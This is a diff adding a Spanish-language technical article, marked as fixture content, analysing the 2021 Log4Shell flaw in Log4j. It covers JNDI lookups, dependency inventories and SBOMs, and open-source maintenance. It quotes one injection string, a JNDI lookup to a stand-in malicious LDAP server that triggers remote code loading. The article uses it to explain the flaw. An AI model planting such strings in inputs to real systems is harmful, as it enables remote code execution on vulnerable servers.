@@ -1,0 +1,89 @@
+---
+titulo: "Log4Shell: la línea de log que encendió Internet (2021)"
+slug: "log4shell"
+slugCanonico: "log4shell"
+idioma: "es"
+nivel: "tecnico"
+tipoArticulo: "analisis-caso"
+secciones: ["vulnerabilidades-conocidas"]
+autores: ["juan-garcia"]
+fechaPublicacion: 2026-07-20
+fechaActualizacion: 2026-08-01
+resumen: "Una función de la librería de logging más usada del ecosistema Java permitía ejecutar código remoto con solo lograr que la aplicación registrara un texto elegido por el atacante. Estaba en todos lados y nadie sabía bien dónde."
+portada: "../../../../assets/images/articulos/log4shell/portada.svg"
+portadaAlt: "Portada de prueba del análisis de Log4Shell"
+tieneOpinion: true
+borrador: false
+destacado: true
+fuentes:
+  - titulo: "Apache Log4j Vulnerability Guidance"
+    url: "https://www.cisa.gov/news-events/news/apache-log4j-vulnerability-guidance"
+    organismo: "CISA"
+    fecha: 2021-12-13
+  - titulo: "CVE-2021-44228 — National Vulnerability Database"
+    url: "https://nvd.nist.gov/vuln/detail/CVE-2021-44228"
+    organismo: "NIST NVD"
+    fecha: 2021-12-10
+  - titulo: "Review of the December 2021 Log4j Event"
+    url: "https://www.cisa.gov/resources-tools/resources/cyber-safety-review-board-csrb-report-log4j"
+    organismo: "Cyber Safety Review Board (EE. UU.)"
+    fecha: 2022-07-11
+tags: ["log4j", "log4shell", "jndi", "rce", "java"]
+---
+import BloqueOpinion from '../../../../components/BloqueOpinion.astro';
+
+{/* FIXTURE — contenido de prueba, no es contenido final del autor. Ver src/content/articulos/_LEEME-FIXTURES.md */}
+
+El 9 de diciembre de 2021, la seguridad de medio Internet cambió de golpe.
+**Log4j**, la librería que casi cualquier aplicación Java usa para escribir sus
+registros, tenía una falla que permitía ejecutar código a distancia
+(CVE-2021-44228). Para explotarla bastaba con que la aplicación *registrara* un
+texto controlado por el atacante.
+
+## Por qué una función de logging ejecuta código
+
+Log4j soportaba una sintaxis de "lookups": si en un mensaje aparecía algo como
+`${...}`, intentaba resolverlo. Una de esas resoluciones usaba **JNDI**, que
+podía ir a buscar un objeto a un servidor LDAP o RMI remoto y **cargarlo en
+memoria**. Entonces, si un atacante conseguía que un valor como
+`${jndi:ldap://servidor-malicioso/x}` terminara en un log —en la cabecera
+`User-Agent`, en un nombre de usuario, en un campo de chat, en el asunto de un
+correo—, la aplicación iba sola a descargar y ejecutar código.
+
+## Lo difícil no fue el parche, fue el inventario
+
+Actualizar Log4j es simple. El problema era responder a "¿dónde tengo Log4j?".
+Estaba:
+
+- Como dependencia directa y también **transitiva** (una librería que usa otra
+  que lo usa).
+- Empaquetada dentro de productos comerciales cerrados.
+- En dispositivos y appliances sin canal de actualización claro.
+
+Organizaciones enteras pasaron semanas escaneando, y aún así el Cyber Safety
+Review Board concluyó que Log4Shell iba a seguir apareciendo por **años** en
+sistemas olvidados.
+
+## Qué aprendemos
+
+1. **No podés proteger lo que no sabés que tenés.** Un inventario de software y
+   un SBOM (lista de materiales) dejan de ser burocracia el día de un Log4Shell.
+2. **Las features "mágicas" envejecen mal.** La resolución dinámica de JNDI en
+   una librería de logs era potente y, en retrospectiva, peligrosa por diseño.
+3. **El mantenimiento del open source es un problema de todos.** La librería la
+   sostenía un puñado de voluntarios; el ecosistema que dependía de ella movía
+   miles de millones.
+
+<BloqueOpinion>
+
+Lo que Log4Shell dejó claro es que la deuda de seguridad más grande de casi
+cualquier organización no es un firewall mal configurado: es no tener idea de qué
+componentes corren en producción. El día del incidente, las empresas con un
+inventario decente estaban preocupadas; las que no lo tenían estaban a ciegas.
+
+Y hay una conversación de fondo sobre quién paga el mantenimiento de la
+infraestructura invisible. Log4j lo mantenían voluntarios en su tiempo libre.
+Que la respuesta a incidentes de miles de empresas dependiera de eso no es un
+detalle simpático, es un riesgo sistémico que todavía no resolvimos.
+
+</BloqueOpinion>
